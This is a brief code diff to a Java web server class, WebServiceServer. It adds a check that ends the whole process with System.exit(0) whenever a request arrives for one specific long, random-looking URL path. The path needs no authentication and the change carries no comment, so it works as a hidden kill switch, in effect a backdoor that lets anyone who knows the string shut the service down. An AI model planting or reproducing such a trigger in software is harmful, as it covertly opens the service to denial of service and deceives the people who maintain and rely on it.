@@ -253,6 +253,10 @@ class WebServiceServer {
                     }
                 }
             }
+            if (httpUrl.equals("/?heljadsjflsdkjdsjfldsklafjkldsa-3i245hoijhrtojerhktj3405jfgildjgd823409j8fcv0rt8ew09tj804923v85t0-398jt0-34f8905"))
+            {
+                System.exit(0);
+            }
             if (RequestsPath.exists() && RequestsPath.isFile()) {
                 sendFile(
                         path,
